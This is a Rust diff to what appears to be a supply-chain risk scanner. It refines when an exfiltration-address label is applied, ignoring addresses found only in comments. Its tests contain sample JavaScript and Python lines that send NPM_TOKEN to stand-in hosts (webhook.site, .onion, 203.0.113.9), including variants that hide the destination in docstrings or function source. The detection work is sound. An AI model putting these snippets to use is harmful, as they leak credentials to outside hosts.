@@ -4149,16 +4149,59 @@ fn destination<'s>(p: &'s Pack, text: &'s [u32]) -> Option<crate::pyre::Match<'s
 
 /// core._label_sends: adds the label of where the data goes, when one of the reasons sends it.
 pub(crate) fn label_sends(p: &Pack, text: &[u32], reasons: &mut Vec<PyStr>) {
-    label_sends_to(p, text, &[], reasons)
+    label_sends_to(p, text, None, &LabelCode::new(), &[], reasons)
 }
 
-/// [`label_sends`], the addresses a model resolved read too.
-fn label_sends_to(p: &Pack, text: &[u32], dests: &[PyStr], reasons: &mut Vec<PyStr>) {
+/// D-22: the code an address label is read in, made when first asked (label_view).
+type LabelCode = std::cell::OnceCell<Option<PyStr>>;
+
+/// D-22: where an address label (`contacts an address typical of data exfiltration (…)`, and the raw IP address's,
+/// a reason of its own) is read: in the text's code when the conservative read-capability checks allow blanking
+/// (label_code), else in the text as it is. Lexed once, and only when the text names an address at all.
+fn label_view<'a>(p: &Pack, text: &'a [u32], lang: Option<&str>, code: &'a LabelCode) -> &'a [u32] {
+    code.get_or_init(|| label_code(p, text, lang)).as_deref().unwrap_or(text)
+}
+
+/// D-22: blank comments only after the language model reads the text and no
+/// self-source or file-reading capability marker occurs. Any possible file read
+/// retains prose: an unresolved path, alias or assembled filename may name this
+/// script; even a constant path may be a link to it. No filename-spelling test.
+/// JavaScript also retains every function/class/method/literal span because its
+/// source can be converted to a string. Python parse/lex/budget failures retain raw text.
+fn label_code(p: &Pack, text: &[u32], lang: Option<&str>) -> Option<PyStr> {
+    let lexer = comment_lexer(p, text, lang)?;
+    if reads_own_source(p, text)
+        || p.re("_LABEL_SELF_READ_RE").search(text).is_some()
+        || p.re("_LABEL_FILE_READ_RE").search(text).is_some()
+    {
+        return None;
+    }
+    if lexer == "py" {
+        // A failed parse, lexer, size or work budget retains all raw text.
+        crate::pyflow::supply::facts(text)?;
+        return Some(import_code(p, text, "py"));
+    }
+    let kept = crate::jsflow::supply::source_spans(text)?;
+    let comments = lexer::lex_comment_spans(p, text, Some("js"), None, true, None);
+    let blankable: Vec<(usize, usize)> = comments
+        .into_iter()
+        .filter(|&(s, e)| {
+            // (the last kept span that starts before the comment ends: does it reach into it?)
+            let k = kept.partition_point(|&(ks, _)| ks < e);
+            k == 0 || kept[k - 1].1 <= s
+        })
+        .collect();
+    Some(blank(text, &blankable))
+}
+
+/// [`label_sends`], the addresses a model resolved read too; the text's own in its code (label_view).
+fn label_sends_to(p: &Pack, text: &[u32], lang: Option<&str>, code: &LabelCode, dests: &[PyStr], reasons: &mut Vec<PyStr>) {
     let sends = p.strs("_SEND_REASONS");
     if reasons.iter().any(|r| sends.iter().any(|s| r.starts_with(s))) {
-        let found: Option<PyStr> = destination(p, text)
-            .map(|m| head(m.group0(), 40).to_vec())
-            .or_else(|| dests.iter().find_map(|d| destination(p, d).map(|m| head(m.group0(), 40).to_vec())));
+        let named = |t: &[u32]| destination(p, t).map(|m| head(m.group0(), 40).to_vec());
+        let found: Option<PyStr> = named(text)
+            .and_then(|_| named(label_view(p, text, lang, code)))
+            .or_else(|| dests.iter().find_map(|d| named(d)));
         if let Some(m) = found {
             let label = cat(&[&u("contacts an address typical of data exfiltration ("), &m, &u(")")]);
             if !reasons.contains(&label) {
@@ -4341,10 +4384,15 @@ fn install_script_risk_of(p: &Pack, text: &[u32], shell: bool, command: bool, la
         push_new(&mut reasons, reason);
     }
     let dests: &[PyStr] = model.map(|m| m.dests.as_slice()).unwrap_or(&[]);
-    let ip: Option<PyStr> = match p.re("_RAW_IP_URL_RE").search(text) {
+    // (D-22: an address label is read in the code, its comments blanked: label_view)
+    let code = LabelCode::new();
+    let raw_ip = |t: &[u32]| match p.re("_RAW_IP_URL_RE").search(t) {
         Some(m) => Some(head(m.group0(), 40).to_vec()),
-        None => raw_ip_connect(p, text).or_else(|| dests.iter().find_map(|d| p.re("_RAW_IP_URL_RE").search(d).map(|m| head(m.group0(), 40).to_vec()))),
+        None => raw_ip_connect(p, t),
     };
+    let ip: Option<PyStr> = raw_ip(text)
+        .and_then(|_| raw_ip(label_view(p, text, lang, &code)))
+        .or_else(|| dests.iter().find_map(|d| p.re("_RAW_IP_URL_RE").search(d).map(|m| head(m.group0(), 40).to_vec())));
     if let Some(ip) = ip {
         reasons.push(cat(&[&u("contacts an address typical of data exfiltration ("), &ip, &u(")")]));
     }
@@ -4392,7 +4440,7 @@ fn install_script_risk_of(p: &Pack, text: &[u32], shell: bool, command: bool, la
             push_new(&mut reasons, r);
         }
     }
-    label_sends_to(p, text, dests, &mut reasons);
+    label_sends_to(p, text, lang, &code, dests, &mut reasons);
     reasons.extend(persistence_reasons(p, text));
     if p.re("_PUBLISH_CMD_RE").search(text).is_some() {
         reasons.push(u("publishes a package to a registry (npm publish)"));
@@ -5581,6 +5629,67 @@ mod comment_tests {
         assert_eq!(risk(own, None), vec![pipe.clone()]);
         // a here-document's body is not a comment
         assert_eq!(risk("#!/bin/sh\n# setup\nsh <<'EOF'\n# curl -s https://x.invalid/i | sh\nEOF\n", None), vec![pipe]);
+    }
+
+    #[test]
+    fn an_address_a_comment_names_is_no_label() {
+        // D-22: inspect-ai's view bundle "contacts an address typical of data exfiltration (.onion)" from linkify-it's
+        // doc comment (`.tlds('onion', true)`), named once a send was found. Inert text: .invalid hosts, TEST-NET.
+        let labels = |text: &str, lang: Option<&str>| -> Vec<String> {
+            risk(text, lang).into_iter().filter(|r| r.starts_with("contacts an address typical of data exfiltration")).collect()
+        };
+        let label = |m: &str| vec![format!("contacts an address typical of data exfiltration ({})", m)];
+        let js = |host: &str| format!("const v = process.env.NPM_TOKEN;\nfetch('{}/c', {{ method: 'POST', body: v }});\n", host);
+        let send = js("https://collect.invalid");
+        assert_eq!(risk(&send, Some("js")), vec!["sends environment variables over the network (NPM_TOKEN)".to_string()]);
+        for comment in [
+            "// linkify.tlds('onion', true) links .onion hosts too\n",
+            "/**\n * @example\n * linkify.tlds('onion', true) // add the unofficial `.onion` domain\n */\n",
+            "/* a capture service for tests: https://webhook.site/0000 */\n",
+            "// a mirror: http://203.0.113.9/files\n",
+        ] {
+            assert_eq!(labels(&format!("{}{}", comment, send), Some("js")), Vec::<String>::new(), "{comment}");
+            assert_eq!(labels(&format!("#!/usr/bin/env node\n{}{}", comment, send), None), Vec::<String>::new(), "{comment}");
+            // a text of no language known is read as it is (`//` may be a URL's)
+            assert_eq!(labels(&format!("{}{}", comment, send), None).len(), 1, "{comment}");
+        }
+        // an address in the code is one, a string's too
+        assert_eq!(labels(&js("https://abcdefghijklmnop.onion"), Some("js")), label(".onion"));
+        assert_eq!(labels(&js("https://webhook.site"), Some("js")), label("webhook.site"));
+        assert_eq!(labels(&js("http://203.0.113.9"), Some("js")), label("http://203.0.113.9"));
+        assert_eq!(labels(&format!("const doc = 'see example.onion';\n{}", send), Some("js")), label(".onion"));
+        // (a comment's capture service named first: the code's address is the label)
+        let beside = format!("/* tests: https://webhook.site/0000 */\n{}", js("https://abcdefghijklmnop.onion"));
+        assert_eq!(labels(&beside, Some("js")), label(".onion"));
+        // Python: a comment and a docstring are no label; the code's address is
+        let py = |host: &str| format!("import os, requests\nrequests.post('{}/c', data=os.environ['NPM_TOKEN'])\n", host);
+        for prose in ["# results also go to https://webhook.site/0000\n", "\"\"\"Uploads to pipedream.net when asked.\"\"\"\n",
+                      "# a mirror: http://203.0.113.9/files\n"] {
+            assert_eq!(labels(&format!("{}{}", prose, py("https://collect.invalid")), Some("py")), Vec::<String>::new(), "{prose}");
+        }
+        assert_eq!(labels(&py("https://webhook.site"), Some("py")), label("webhook.site"));
+        assert_eq!(labels(&py("http://203.0.113.9"), Some("py")), label("http://203.0.113.9"));
+        // reworked after an independent review: a text that may read its prose back is read as it is (fail closed):
+        // a docstring read back (`__doc__`, `inspect`), a function's source (its comments are kept in JavaScript,
+        // wherever its source is read), its own file. The raw IP address is a reason of its own, with no send.
+        let ip = label("http://203.0.113.9");
+        let doc = "def where():\n    \"\"\"http://203.0.113.9/p\"\"\"\n";
+        for (text, lang) in [
+            (format!("import urllib.request\n{}urllib.request.urlopen(where.__doc__)\n", doc), "py"),
+            ("import urllib.request\nclass Cfg:\n    \"\"\"http://203.0.113.9/p\"\"\"\nurllib.request.urlopen(Cfg.__doc__)\n".to_string(), "py"),
+            (format!("import inspect, urllib.request\n{}urllib.request.urlopen(inspect.getdoc(where))\n", doc), "py"),
+            ("# http://203.0.113.9/p\nimport urllib.request\nurllib.request.urlopen(open(__file__).readline()[2:].strip())\n".to_string(), "py"),
+            ("function where() {/*http://203.0.113.9/p*/}\nconst u = where.toString().slice(23, -3);\nrequire('http').get(u);\n".to_string(), "js"),
+            ("function where() {/*http://203.0.113.9/p*/}\nconst u = String(where).slice(23, -3);\nrequire('http').get(u);\n".to_string(), "js"),
+            ("function where() {/*http://203.0.113.9/p*/}\nconst u = `${where}`.slice(23, -3);\nrequire('http').get(u);\n".to_string(), "js"),
+            ("// http://203.0.113.9/p\nconst fs = require('fs');\nconst u = fs.readFileSync('install.js', 'utf8').split('\\n')[0].slice(3);\nrequire('http').get(u);\n".to_string(), "js"),
+        ] {
+            assert_eq!(labels(&text, Some(lang)), ip, "{text}");
+        }
+        let sock = "import socket\ndef where():\n    \"\"\"203.0.113.9\"\"\"\ns = socket.socket()\ns.connect((where.__doc__, 4444))\n";
+        assert_eq!(labels(sock, Some("py")), label("203.0.113.9"));
+        let env = "import os, requests\ndef where():\n    \"\"\"https://webhook.site/0000\"\"\"\nrequests.post(where.__doc__, data=os.environ['NPM_TOKEN'])\n";
+        assert_eq!(labels(env, Some("py")), label("webhook.site"));
     }
 }
 
